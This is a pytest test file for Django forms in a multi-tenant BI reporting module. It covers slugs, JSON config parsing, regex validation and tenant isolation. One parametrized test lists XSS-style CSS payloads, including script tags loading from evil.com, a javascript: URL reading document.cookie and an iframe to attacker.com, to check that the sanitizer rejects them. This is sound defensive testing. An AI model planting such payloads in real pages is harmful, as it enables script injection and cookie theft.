"""Unit tests for Sub-module 10.9 Standard & Operational Reporting forms.

Forms covered:
- ReportDefinitionForm
- ReportCloneForm
- ReportParameterForm
- ReportExecutionRunForm
- ReportDrillPathForm
"""
import json
import pytest
from django import forms
from django.core.exceptions import ValidationError

from apps.bi.forms.OperationalReporting import (
    ReportCloneForm,
    ReportDefinitionForm,
    ReportDrillPathForm,
    ReportExecutionRunForm,
    ReportParameterForm,
)
from apps.bi.models import (
    ReportDefinition,
    ReportDrillPath,
    ReportExecution,
    ReportParameter,
    SemanticModel,
    WarehouseTable,
)
from apps.core.models import OrgUnit


# ---------------------------------------------------------------------------
# Module Helpers (named _operationalreporting_*)
# ---------------------------------------------------------------------------


def _operationalreporting_create_org_unit(tenant, name="Finance Department"):
    """Helper to create a tenant-scoped OrgUnit."""
    return OrgUnit.objects.create(tenant=tenant, name=name)


def _operationalreporting_create_report(
    tenant,
    user,
    name="Standard Revenue Report",
    slug="standard-revenue-report",
    **kwargs,
):
    """Helper to create a tenant-scoped ReportDefinition with valid fields."""
    return ReportDefinition.objects.create(
        tenant=tenant,
        created_by=user,
        name=name,
        slug=slug,
        category=kwargs.get("category", "sales"),
        report_type=kwargs.get("report_type", "standard_tabular"),
        paper_size=kwargs.get("paper_size", "a4"),
        orientation=kwargs.get("orientation", "portrait"),
        status=kwargs.get("status", "published"),
        is_prebuilt_template=kwargs.get("is_prebuilt_template", False),
        **{
            k: v
            for k, v in kwargs.items()
            if k
            not in (
                "category",
                "report_type",
                "paper_size",
                "orientation",
                "status",
                "is_prebuilt_template",
            )
        },
    )


def _operationalreporting_base_definition_data(**overrides):
    """Helper generating valid ReportDefinition form payload."""
    data = {
        "name": "Standard Operational P&L",
        "slug": "standard-operational-pl",
        "category": "finance",
        "report_type": "standard_tabular",
        "paper_size": "a4",
        "orientation": "portrait",
        "semantic_model": "",
        "warehouse_table": "",
        "org_unit": "",
        "status": "draft",
        "is_prebuilt_template": False,
        "watermark_text": "CONFIDENTIAL",
        "description": "Enterprise standard operational financial report.",
        "raw_query": "SELECT account, balance FROM general_ledger",
        "styling_css": "table { width: 100%; border-collapse: collapse; }",
        "margins_json": '{"top": 20, "bottom": 20, "left": 15, "right": 15}',
        "bands_config_json": '{"header": {"height_mm": 25}, "detail": {"height_mm": 10}}',
        "columns_config_json": '[{"field": "account", "title": "Account Code"}, {"field": "balance", "title": "Balance"}]',
        "is_active": True,
    }
    data.update(overrides)
    return data


def _operationalreporting_base_parameter_data(report_pk, **overrides):
    """Helper generating valid ReportParameter form payload."""
    data = {
        "report": report_pk,
        "parameter_name": "fiscal_year",
        "prompt_label": "Fiscal Year Selection",
        "parameter_type": "string",
        "default_value": "2026",
        "choices_source": "static_list",
        "choices_config_json": '[{"value": "2025", "label": "FY 2025"}, {"value": "2026", "label": "FY 2026"}]',
        "validation_regex": r"^\d{4}$",
        "help_text": "Select the fiscal calendar year to filter ledger entries.",
        "prompt_order": 10,
        "is_required": True,
        "is_hidden": False,
        "is_active": True,
    }
    data.update(overrides)
    return data


def _operationalreporting_base_drill_path_data(source_report_pk, **overrides):
    """Helper generating valid ReportDrillPath form payload."""
    data = {
        "source_report": source_report_pk,
        "source_field": "invoice_id",
        "drill_label": "View Customer Invoice Lines",
        "target_type": "operational_report",
        "target_report": source_report_pk,
        "target_url_pattern": "/bi/reports/viewer/{target_report}/?invoice_id={invoice_id}",
        "parameter_mapping_json": '{"invoice_id": "target_invoice_id"}',
        "sort_order": 10,
        "is_enabled": True,
    }
    data.update(overrides)
    return data


# ---------------------------------------------------------------------------
# 1. ReportDefinitionForm Tests
# ---------------------------------------------------------------------------


@pytest.mark.django_db
def test_operationalreporting_definition_form_valid_complete(
    tenant_a, admin_user, semantic_model_a, warehouse_table_a
):
    """Test valid complete ReportDefinitionForm payload with all fields populated."""
    org_unit = _operationalreporting_create_org_unit(tenant_a, "Treasury Ops")
    payload = _operationalreporting_base_definition_data(
        semantic_model=semantic_model_a.pk,
        warehouse_table=warehouse_table_a.pk,
        org_unit=org_unit.pk,
    )
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors

    instance = form.save(commit=False)
    instance.tenant = tenant_a
    instance.created_by = admin_user
    instance.save()

    assert instance.pk is not None
    assert instance.name == "Standard Operational P&L"
    assert instance.slug == "standard-operational-pl"
    assert instance.semantic_model == semantic_model_a
    assert instance.warehouse_table == warehouse_table_a
    assert instance.org_unit == org_unit
    assert instance.margins_json == {"top": 20, "bottom": 20, "left": 15, "right": 15}
    assert instance.bands_config_json == {"header": {"height_mm": 25}, "detail": {"height_mm": 10}}
    assert len(instance.columns_config_json) == 2
    assert instance.number.startswith("BRPT-")


@pytest.mark.django_db
def test_operationalreporting_definition_form_auto_slugify_when_blank(tenant_a):
    """Test that omitting slug auto-generates slug from report name."""
    payload = _operationalreporting_base_definition_data(
        name="Global Cash Flow Projection",
        slug="",
    )
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["slug"] == "global-cash-flow-projection"


@pytest.mark.django_db
def test_operationalreporting_definition_form_explicit_slug_preserved(tenant_a):
    """Test that providing an explicit slug preserves the user's slug choice."""
    payload = _operationalreporting_base_definition_data(
        name="Global Cash Flow Projection",
        slug="custom-q3-cf-proj",
    )
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["slug"] == "custom-q3-cf-proj"


@pytest.mark.django_db
def test_operationalreporting_definition_form_duplicate_slug_within_tenant_rejected(
    tenant_a, admin_user
):
    """Test that a duplicate slug within the same tenant fails validation via TenantUniqueMixin."""
    existing_report = _operationalreporting_create_report(
        tenant_a, admin_user, name="Existing Report", slug="existing-unique-slug"
    )
    payload = _operationalreporting_base_definition_data(
        name="Duplicate Slug Report",
        slug=existing_report.slug,
    )
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    assert not form.is_valid()
    assert "slug" in form.errors or "__all__" in form.errors


@pytest.mark.django_db
def test_operationalreporting_definition_form_duplicate_slug_cross_tenant_allowed(
    tenant_a, tenant_b, admin_user, admin_user_b
):
    """Test that the same slug is permitted across different tenant workspaces."""
    existing_report_a = _operationalreporting_create_report(
        tenant_a, admin_user, name="Acme Revenue Report", slug="monthly-revenue-summary"
    )
    payload = _operationalreporting_base_definition_data(
        name="Globex Monthly Revenue",
        slug=existing_report_a.slug,
    )
    form = ReportDefinitionForm(data=payload, tenant=tenant_b)
    assert form.is_valid(), form.errors


@pytest.mark.django_db
def test_operationalreporting_definition_form_styling_css_clean_valid(tenant_a):
    """Test that valid CSS styles without injection constructs pass clean_styling_css."""
    valid_css = (
        "@media print { body { font-size: 10pt; } } "
        ".report-header { color: #1e293b; border-bottom: 2px solid #cbd5e1; } "
        ".data-row:nth-child(even) { background-color: #f8fafc; }"
    )
    payload = _operationalreporting_base_definition_data(styling_css=valid_css)
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["styling_css"] == valid_css


@pytest.mark.django_db
@pytest.mark.parametrize(
    "malicious_css,pattern",
    [
        ("<script>alert('xss')</script>", "<script"),
        ("</script><script src='https://evil.com/xss.js'></script>", "<script"),
        ("body { color: red; } </style><p>hacked</p>", "</style"),
        ("body { background: url('javascript:alert(document.cookie)'); }", "javascript:"),
        (".badge { behavior: url(test.htc); } onload=stealData()", "onload="),
        ("img { border: 0; } onerror=eval(payload)", "onerror="),
        ("<iframe src='https://attacker.com/leak'></iframe>", "<iframe"),
        ("div { display: none; } </iframe>", "</iframe"),
    ],
)
def test_operationalreporting_definition_form_styling_css_rejections(
    tenant_a, malicious_css, pattern
):
    """Test clean_styling_css actively rejects forbidden HTML, script tags, event handlers, and javascript:."""
    payload = _operationalreporting_base_definition_data(styling_css=malicious_css)
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    assert not form.is_valid()
    assert "styling_css" in form.errors
    assert any(
        "is not permitted" in err or pattern.lower() in err.lower()
        for err in form.errors["styling_css"]
    )


@pytest.mark.django_db
def test_operationalreporting_definition_form_margins_json_parsing_and_fallback(tenant_a):
    """Test clean_margins_json parses valid JSON string and falls back to default 15mm margins when blank."""
    # Custom JSON string
    custom_margins = '{"top": 25, "bottom": 25, "left": 10, "right": 10}'
    payload = _operationalreporting_base_definition_data(margins_json=custom_margins)
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["margins_json"] == {"top": 25, "bottom": 25, "left": 10, "right": 10}

    # Blank/omitted margins_json -> default standard fallback
    payload_empty = _operationalreporting_base_definition_data(margins_json="")
    form_empty = ReportDefinitionForm(data=payload_empty, tenant=tenant_a)
    assert form_empty.is_valid(), form_empty.errors
    assert form_empty.cleaned_data["margins_json"] == {
        "top": 15,
        "bottom": 15,
        "left": 15,
        "right": 15,
    }


@pytest.mark.django_db
def test_operationalreporting_definition_form_margins_json_invalid_raises_error(tenant_a):
    """Test clean_margins_json rejects malformed non-JSON string."""
    payload = _operationalreporting_base_definition_data(margins_json="{not a valid json")
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    assert not form.is_valid()
    assert "margins_json" in form.errors
    assert any("valid json" in err.lower() or "invalid json" in err.lower() for err in form.errors["margins_json"])

    # Direct clean_margins_json call with invalid string
    form_direct = ReportDefinitionForm(tenant=tenant_a)
    form_direct.cleaned_data = {"margins_json": "{broken json string"}
    with pytest.raises(forms.ValidationError) as exc_info:
        form_direct.clean_margins_json()
    assert "Invalid JSON" in str(exc_info.value)


@pytest.mark.django_db
def test_operationalreporting_definition_form_bands_config_json_parsing_and_fallback(tenant_a):
    """Test clean_bands_config_json parses valid bands JSON and defaults to empty dict."""
    # Custom bands
    bands_str = '{"title_band": {"height_mm": 30}, "summary_band": {"height_mm": 15}}'
    payload = _operationalreporting_base_definition_data(bands_config_json=bands_str)
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["bands_config_json"] == {
        "title_band": {"height_mm": 30},
        "summary_band": {"height_mm": 15},
    }

    # Blank bands -> empty dict
    payload_blank = _operationalreporting_base_definition_data(bands_config_json="")
    form_blank = ReportDefinitionForm(data=payload_blank, tenant=tenant_a)
    assert form_blank.is_valid(), form_blank.errors
    assert form_blank.cleaned_data["bands_config_json"] == {}


@pytest.mark.django_db
def test_operationalreporting_definition_form_bands_config_json_invalid_raises_error(tenant_a):
    """Test clean_bands_config_json rejects invalid JSON."""
    payload = _operationalreporting_base_definition_data(bands_config_json="['unclosed list")
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    assert not form.is_valid()
    assert "bands_config_json" in form.errors
    assert any("valid json" in err.lower() or "invalid json" in err.lower() for err in form.errors["bands_config_json"])

    # Direct clean_bands_config_json call with invalid string
    form_direct = ReportDefinitionForm(tenant=tenant_a)
    form_direct.cleaned_data = {"bands_config_json": "['unclosed list"}
    with pytest.raises(forms.ValidationError) as exc_info:
        form_direct.clean_bands_config_json()
    assert "Invalid JSON" in str(exc_info.value)


@pytest.mark.django_db
def test_operationalreporting_definition_form_columns_config_json_parsing_and_fallback(tenant_a):
    """Test clean_columns_config_json parses column spec array and defaults to empty list."""
    cols_str = '[{"field": "customer", "title": "Customer Name", "width": "40%"}]'
    payload = _operationalreporting_base_definition_data(columns_config_json=cols_str)
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["columns_config_json"] == [
        {"field": "customer", "title": "Customer Name", "width": "40%"}
    ]

    # Blank columns -> empty list
    payload_blank = _operationalreporting_base_definition_data(columns_config_json="")
    form_blank = ReportDefinitionForm(data=payload_blank, tenant=tenant_a)
    assert form_blank.is_valid(), form_blank.errors
    assert form_blank.cleaned_data["columns_config_json"] == []


@pytest.mark.django_db
def test_operationalreporting_definition_form_columns_config_json_invalid_raises_error(tenant_a):
    """Test clean_columns_config_json rejects malformed column JSON."""
    payload = _operationalreporting_base_definition_data(columns_config_json="{must be array but broken")
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    assert not form.is_valid()
    assert "columns_config_json" in form.errors
    assert any("valid json" in err.lower() or "invalid json" in err.lower() for err in form.errors["columns_config_json"])

    # Direct clean_columns_config_json call with invalid string
    form_direct = ReportDefinitionForm(tenant=tenant_a)
    form_direct.cleaned_data = {"columns_config_json": "{broken array"}
    with pytest.raises(forms.ValidationError) as exc_info:
        form_direct.clean_columns_config_json()
    assert "Invalid JSON" in str(exc_info.value)


@pytest.mark.django_db
def test_operationalreporting_definition_form_tenant_queryset_scoping(
    tenant_a,
    tenant_b,
    semantic_model_a,
    semantic_model_b,
    warehouse_table_a,
    warehouse_table_b,
):
    """Verify that form __init__ scopes foreign key querysets strictly to the tenant."""
    ou_a = _operationalreporting_create_org_unit(tenant_a, "Acme Finance")
    ou_b = _operationalreporting_create_org_unit(tenant_b, "Globex Logistics")

    form = ReportDefinitionForm(tenant=tenant_a)
    sm_qs = list(form.fields["semantic_model"].queryset)
    wt_qs = list(form.fields["warehouse_table"].queryset)
    ou_qs = list(form.fields["org_unit"].queryset)

    assert semantic_model_a in sm_qs
    assert semantic_model_b not in sm_qs

    assert warehouse_table_a in wt_qs
    assert warehouse_table_b not in wt_qs

    assert ou_a in ou_qs
    assert ou_b not in ou_qs


@pytest.mark.django_db
def test_operationalreporting_definition_form_reject_foreign_semantic_model(
    tenant_a, semantic_model_b
):
    """Verify reject_foreign defense blocks foreign tenant semantic model."""
    payload = _operationalreporting_base_definition_data(semantic_model=semantic_model_b.pk)
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    # Widen queryset to simulate bypassing client-side dropdown restriction
    form.fields["semantic_model"].queryset = SemanticModel.objects.all()
    assert not form.is_valid()
    assert "semantic_model" in form.errors
    assert "That record belongs to another workspace." in form.errors["semantic_model"]


@pytest.mark.django_db
def test_operationalreporting_definition_form_reject_foreign_warehouse_table(
    tenant_a, warehouse_table_b
):
    """Verify reject_foreign defense blocks foreign tenant warehouse table."""
    payload = _operationalreporting_base_definition_data(warehouse_table=warehouse_table_b.pk)
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    form.fields["warehouse_table"].queryset = WarehouseTable.objects.all()
    assert not form.is_valid()
    assert "warehouse_table" in form.errors
    assert "That record belongs to another workspace." in form.errors["warehouse_table"]


@pytest.mark.django_db
def test_operationalreporting_definition_form_reject_foreign_org_unit(
    tenant_a, tenant_b
):
    """Verify reject_foreign defense blocks foreign tenant org unit."""
    ou_b = _operationalreporting_create_org_unit(tenant_b, "Globex HR")
    payload = _operationalreporting_base_definition_data(org_unit=ou_b.pk)
    form = ReportDefinitionForm(data=payload, tenant=tenant_a)
    form.fields["org_unit"].queryset = OrgUnit.objects.all()
    assert not form.is_valid()
    assert "org_unit" in form.errors
    assert "That record belongs to another workspace." in form.errors["org_unit"]


def test_operationalreporting_definition_form_meta_field_exclusions():
    """Verify security allowlist: auto-number, tenant, timestamps and auditor fields are excluded."""
    fields = ReportDefinitionForm.Meta.fields
    assert "tenant" not in fields
    assert "number" not in fields
    assert "created_at" not in fields
    assert "updated_at" not in fields
    assert "created_by" not in fields


# ---------------------------------------------------------------------------
# 2. ReportCloneForm Tests
# ---------------------------------------------------------------------------


def test_operationalreporting_clone_form_valid_with_explicit_slug(tenant_a):
    """Test valid report clone with an explicit new slug."""
    payload = {
        "new_name": "Executive Profit & Loss (Fork)",
        "new_slug": "executive-profit-loss-fork",
    }
    form = ReportCloneForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["new_name"] == "Executive Profit & Loss (Fork)"
    assert form.cleaned_data["new_slug"] == "executive-profit-loss-fork"


def test_operationalreporting_clone_form_valid_with_auto_generated_slug(tenant_a):
    """Test valid report clone with empty slug auto-generating slug from new_name."""
    payload = {
        "new_name": "Quarterly Operations Ledger Report",
        "new_slug": "",
    }
    form = ReportCloneForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["new_slug"] == "quarterly-operations-ledger-report"


@pytest.mark.django_db
def test_operationalreporting_clone_form_duplicate_explicit_slug_rejected(
    tenant_a, admin_user
):
    """Test that specifying an explicit slug that already exists in the tenant is rejected."""
    existing_report = _operationalreporting_create_report(
        tenant_a, admin_user, name="Original Report", slug="original-unique-slug"
    )
    payload = {
        "new_name": "Cloned Report Title",
        "new_slug": existing_report.slug,
    }
    form = ReportCloneForm(data=payload, tenant=tenant_a)
    assert not form.is_valid()
    assert "new_slug" in form.errors
    assert "A report with this slug already exists." in form.errors["new_slug"]


@pytest.mark.django_db
def test_operationalreporting_clone_form_duplicate_auto_slug_rejected(
    tenant_a, admin_user
):
    """Test that auto-generated slug matching an existing report in the tenant is rejected."""
    existing_report = _operationalreporting_create_report(
        tenant_a, admin_user, name="Annual Balance Sheet", slug="annual-balance-sheet"
    )
    payload = {
        "new_name": existing_report.name,
        "new_slug": "",
    }
    form = ReportCloneForm(data=payload, tenant=tenant_a)
    assert not form.is_valid()
    assert "new_slug" in form.errors
    assert (
        "A report with this auto-generated slug already exists"
        in form.errors["new_slug"][0]
    )


@pytest.mark.django_db
def test_operationalreporting_clone_form_cross_tenant_duplicate_slug_allowed(
    tenant_a, tenant_b, admin_user_b
):
    """Test that duplicate slug from a foreign tenant does not prevent clone in tenant_a."""
    existing_report_b = _operationalreporting_create_report(
        tenant_b, admin_user_b, name="Globex Master Report", slug="globex-master-report"
    )
    payload = {
        "new_name": "Acme Copy of Globex Report",
        "new_slug": existing_report_b.slug,
    }
    form = ReportCloneForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors


def test_operationalreporting_clone_form_missing_new_name_rejected(tenant_a):
    """Test that omitting new_name fails validation."""
    form = ReportCloneForm(data={"new_name": "", "new_slug": "test-slug"}, tenant=tenant_a)
    assert not form.is_valid()
    assert "new_name" in form.errors


# ---------------------------------------------------------------------------
# 3. ReportParameterForm Tests
# ---------------------------------------------------------------------------


@pytest.mark.django_db
def test_operationalreporting_parameter_form_valid_complete(tenant_a, admin_user):
    """Test valid complete ReportParameterForm payload."""
    report = _operationalreporting_create_report(tenant_a, admin_user, name="Cost Center Summary")
    payload = _operationalreporting_base_parameter_data(report.pk)
    form = ReportParameterForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors

    instance = form.save(commit=False)
    instance.tenant = tenant_a
    instance.save()

    assert instance.pk is not None
    assert instance.report == report
    assert instance.parameter_name == "fiscal_year"
    assert instance.prompt_label == "Fiscal Year Selection"
    assert instance.parameter_type == "string"
    assert instance.default_value == "2026"
    assert instance.choices_source == "static_list"
    assert len(instance.choices_config_json) == 2
    assert instance.validation_regex == r"^\d{4}$"
    assert instance.prompt_order == 10
    assert instance.is_required is True
    assert instance.number.startswith("BPAR-")


@pytest.mark.django_db
def test_operationalreporting_parameter_form_auto_generate_parameter_name(
    tenant_a, admin_user
):
    """Test that parameter_name is auto-generated from prompt_label when blank."""
    report = _operationalreporting_create_report(tenant_a, admin_user)
    payload = _operationalreporting_base_parameter_data(
        report.pk,
        parameter_name="",
        prompt_label="Fiscal Period End Date",
    )
    form = ReportParameterForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["parameter_name"] == "fiscal_period_end_date"


@pytest.mark.django_db
def test_operationalreporting_parameter_form_explicit_parameter_name_preserved(
    tenant_a, admin_user
):
    """Test that explicit parameter_name is preserved without modification."""
    report = _operationalreporting_create_report(tenant_a, admin_user)
    payload = _operationalreporting_base_parameter_data(
        report.pk,
        parameter_name="custom_fiscal_code",
        prompt_label="Select Fiscal Code",
    )
    form = ReportParameterForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["parameter_name"] == "custom_fiscal_code"


@pytest.mark.django_db
def test_operationalreporting_parameter_form_validation_regex_valid(
    tenant_a, admin_user
):
    """Test that valid regex patterns compile cleanly in clean_validation_regex."""
    report = _operationalreporting_create_report(tenant_a, admin_user)
    valid_regex = r"^[A-Z]{2,4}-\d{3,6}$"
    payload = _operationalreporting_base_parameter_data(
        report.pk, validation_regex=valid_regex
    )
    form = ReportParameterForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["validation_regex"] == valid_regex


@pytest.mark.django_db
def test_operationalreporting_parameter_form_validation_regex_invalid_raises_error(
    tenant_a, admin_user
):
    """Test that malformed regular expression pattern raises ValidationError."""
    report = _operationalreporting_create_report(tenant_a, admin_user)
    payload = _operationalreporting_base_parameter_data(
        report.pk, validation_regex=r"([a-z"
    )
    form = ReportParameterForm(data=payload, tenant=tenant_a)
    assert not form.is_valid()
    assert "validation_regex" in form.errors
    assert "Invalid regular expression pattern" in form.errors["validation_regex"][0]


@pytest.mark.django_db
def test_operationalreporting_parameter_form_choices_config_json_valid_and_fallback(
    tenant_a, admin_user
):
    """Test choices_config_json parses JSON list and defaults to empty list when blank."""
    report = _operationalreporting_create_report(tenant_a, admin_user)
    valid_json = '[{"value": "posted", "label": "Posted Only"}, {"value": "all", "label": "All"}]'
    payload = _operationalreporting_base_parameter_data(
        report.pk, choices_config_json=valid_json
    )
    form = ReportParameterForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["choices_config_json"] == [
        {"value": "posted", "label": "Posted Only"},
        {"value": "all", "label": "All"},
    ]

    # Blank -> empty list
    payload_blank = _operationalreporting_base_parameter_data(
        report.pk, choices_config_json=""
    )
    form_blank = ReportParameterForm(data=payload_blank, tenant=tenant_a)
    assert form_blank.is_valid(), form_blank.errors
    assert form_blank.cleaned_data["choices_config_json"] == []


@pytest.mark.django_db
def test_operationalreporting_parameter_form_choices_config_json_invalid_raises_error(
    tenant_a, admin_user
):
    """Test choices_config_json rejects invalid JSON."""
    report = _operationalreporting_create_report(tenant_a, admin_user)
    payload = _operationalreporting_base_parameter_data(
        report.pk, choices_config_json="not-a-json-payload"
    )
    form = ReportParameterForm(data=payload, tenant=tenant_a)
    assert not form.is_valid()
    assert "choices_config_json" in form.errors
    assert any("valid json" in err.lower() or "invalid json" in err.lower() for err in form.errors["choices_config_json"])

    # Direct clean_choices_config_json call with invalid string
    form_direct = ReportParameterForm(tenant=tenant_a)
    form_direct.cleaned_data = {"choices_config_json": "not-valid-json"}
    with pytest.raises(forms.ValidationError) as exc_info:
        form_direct.clean_choices_config_json()
    assert "Invalid JSON" in str(exc_info.value)


@pytest.mark.django_db
def test_operationalreporting_parameter_form_parameter_type_choices_validation(
    tenant_a, admin_user
):
    """Test validation of parameter_type choices and rejection of unsupported choices."""
    report = _operationalreporting_create_report(tenant_a, admin_user)
    valid_types = [
        "string",
        "integer",
        "decimal",
        "date",
        "daterange",
        "boolean",
        "choice_single",
        "choice_multi",
    ]
    for p_type in valid_types:
        payload = _operationalreporting_base_parameter_data(
            report.pk, parameter_type=p_type
        )
        form = ReportParameterForm(data=payload, tenant=tenant_a)
        assert form.is_valid(), f"Failed for valid type: {p_type}"

    # Invalid type
    payload_bad = _operationalreporting_base_parameter_data(
        report.pk, parameter_type="unsupported_quantum_type"
    )
    form_bad = ReportParameterForm(data=payload_bad, tenant=tenant_a)
    assert not form_bad.is_valid()
    assert "parameter_type" in form_bad.errors


@pytest.mark.django_db
def test_operationalreporting_parameter_form_tenant_queryset_scoping(
    tenant_a, tenant_b, admin_user, admin_user_b
):
    """Verify that form __init__ scopes the report dropdown queryset to the tenant."""
    report_a = _operationalreporting_create_report(tenant_a, admin_user, name="Acme Report P")
    report_b = _operationalreporting_create_report(tenant_b, admin_user_b, name="Globex Report P")

    form = ReportParameterForm(tenant=tenant_a)
    report_qs = list(form.fields["report"].queryset)
    assert report_a in report_qs
    assert report_b not in report_qs


@pytest.mark.django_db
def test_operationalreporting_parameter_form_reject_foreign_report(
    tenant_a, tenant_b, admin_user_b
):
    """Verify reject_foreign stops linking parameter to a report in a different tenant."""
    report_b = _operationalreporting_create_report(tenant_b, admin_user_b, name="Foreign Report")
    payload = _operationalreporting_base_parameter_data(report_b.pk)
    form = ReportParameterForm(data=payload, tenant=tenant_a)
    form.fields["report"].queryset = ReportDefinition.objects.all()
    assert not form.is_valid()
    assert "report" in form.errors
    assert "That record belongs to another workspace." in form.errors["report"]


def test_operationalreporting_parameter_form_meta_field_exclusions():
    """Verify tenant, number, created_at, and updated_at are excluded from parameter form Meta."""
    fields = ReportParameterForm.Meta.fields
    assert "tenant" not in fields
    assert "number" not in fields
    assert "created_at" not in fields
    assert "updated_at" not in fields


# ---------------------------------------------------------------------------
# 4. ReportExecutionRunForm Tests
# ---------------------------------------------------------------------------


@pytest.mark.django_db
def test_operationalreporting_execution_run_form_valid_modes_and_formats(tenant_a):
    """Test valid combinations of execution_mode and output_format."""
    valid_modes = [
        "interactive_view",
        "export_pdf",
        "export_excel",
        "export_csv",
        "export_docx",
        "drill_through",
    ]
    valid_formats = ["html", "pdf", "xlsx", "csv", "docx", "json"]

    for mode in valid_modes:
        for fmt in valid_formats:
            form = ReportExecutionRunForm(
                data={"execution_mode": mode, "output_format": fmt},
                tenant=tenant_a,
            )
            assert form.is_valid(), f"Failed for mode={mode}, format={fmt}: {form.errors}"


def test_operationalreporting_execution_run_form_invalid_execution_mode_rejected(tenant_a):
    """Test rejection of invalid execution_mode choice."""
    form = ReportExecutionRunForm(
        data={"execution_mode": "instant_satellite_stream", "output_format": "html"},
        tenant=tenant_a,
    )
    assert not form.is_valid()
    assert "execution_mode" in form.errors


def test_operationalreporting_execution_run_form_invalid_output_format_rejected(tenant_a):
    """Test rejection of invalid output_format choice."""
    form = ReportExecutionRunForm(
        data={"execution_mode": "interactive_view", "output_format": "audio_wav"},
        tenant=tenant_a,
    )
    assert not form.is_valid()
    assert "output_format" in form.errors


@pytest.mark.django_db
def test_operationalreporting_execution_run_form_save_instance(
    tenant_a, admin_user
):
    """Test saving execution run instance with assigned tenant, report, and executed_by."""
    report = _operationalreporting_create_report(tenant_a, admin_user)
    form = ReportExecutionRunForm(
        data={"execution_mode": "interactive_view", "output_format": "html"},
        tenant=tenant_a,
    )
    assert form.is_valid(), form.errors
    instance = form.save(commit=False)
    instance.tenant = tenant_a
    instance.report = report
    instance.executed_by = admin_user
    instance.save()

    assert instance.pk is not None
    assert instance.number.startswith("BRUN-")
    assert instance.execution_mode == "interactive_view"
    assert instance.output_format == "html"
    assert instance.execution_status == "completed"


def test_operationalreporting_execution_run_form_meta_field_exclusions():
    """Verify explicit field allowlist: execution form contains only execution_mode and output_format."""
    assert ReportExecutionRunForm.Meta.fields == ["execution_mode", "output_format"]
    excluded_fields = [
        "tenant",
        "number",
        "report",
        "executed_by",
        "execution_status",
        "error_message",
        "query_text",
        "row_count",
        "output_file",
        "execution_duration_ms",
        "parameters_applied_json",
        "created_at",
    ]
    for f in excluded_fields:
        assert f not in ReportExecutionRunForm.Meta.fields


# ---------------------------------------------------------------------------
# 5. ReportDrillPathForm Tests
# ---------------------------------------------------------------------------


@pytest.mark.django_db
def test_operationalreporting_drill_path_form_valid_complete(
    tenant_a, admin_user
):
    """Test valid complete ReportDrillPathForm payload."""
    report = _operationalreporting_create_report(tenant_a, admin_user)
    payload = _operationalreporting_base_drill_path_data(
        report.pk,
        target_report=report.pk,
    )
    form = ReportDrillPathForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors

    instance = form.save(commit=False)
    instance.tenant = tenant_a
    instance.save()

    assert instance.pk is not None
    assert instance.source_report == report
    assert instance.target_report == report
    assert instance.source_field == "invoice_id"
    assert instance.drill_label == "View Customer Invoice Lines"
    assert instance.target_type == "operational_report"
    assert instance.parameter_mapping_json == {"invoice_id": "target_invoice_id"}
    assert instance.sort_order == 10
    assert instance.is_enabled is True
    assert instance.number.startswith("BDRP-")


@pytest.mark.django_db
def test_operationalreporting_drill_path_form_parameter_mapping_json_valid_and_fallback(
    tenant_a, admin_user
):
    """Test parameter_mapping_json parses valid JSON mapping and defaults to empty dict."""
    report = _operationalreporting_create_report(tenant_a, admin_user)
    valid_map = '{"source_account": "target_account", "currency": "doc_currency"}'
    payload = _operationalreporting_base_drill_path_data(
        report.pk, parameter_mapping_json=valid_map
    )
    form = ReportDrillPathForm(data=payload, tenant=tenant_a)
    assert form.is_valid(), form.errors
    assert form.cleaned_data["parameter_mapping_json"] == {
        "source_account": "target_account",
        "currency": "doc_currency",
    }

    # Blank mapping -> empty dict
    payload_blank = _operationalreporting_base_drill_path_data(
        report.pk, parameter_mapping_json=""
    )
    form_blank = ReportDrillPathForm(data=payload_blank, tenant=tenant_a)
    assert form_blank.is_valid(), form_blank.errors
    assert form_blank.cleaned_data["parameter_mapping_json"] == {}


@pytest.mark.django_db
def test_operationalreporting_drill_path_form_parameter_mapping_json_invalid_raises_error(
    tenant_a, admin_user
):
    """Test parameter_mapping_json rejects invalid JSON."""
    report = _operationalreporting_create_report(tenant_a, admin_user)
    payload = _operationalreporting_base_drill_path_data(
        report.pk, parameter_mapping_json="unclosed-json-{"
    )
    form = ReportDrillPathForm(data=payload, tenant=tenant_a)
    assert not form.is_valid()
    assert "parameter_mapping_json" in form.errors
    assert any("valid json" in err.lower() or "invalid json" in err.lower() for err in form.errors["parameter_mapping_json"])

    # Direct clean_parameter_mapping_json call with invalid string
    form_direct = ReportDrillPathForm(tenant=tenant_a)
    form_direct.cleaned_data = {"parameter_mapping_json": "unclosed-{"}
    with pytest.raises(forms.ValidationError) as exc_info:
        form_direct.clean_parameter_mapping_json()
    assert "Invalid JSON" in str(exc_info.value)


@pytest.mark.django_db
def test_operationalreporting_drill_path_form_target_type_choices_validation(
    tenant_a, admin_user
):
    """Test validation of target_type choices."""
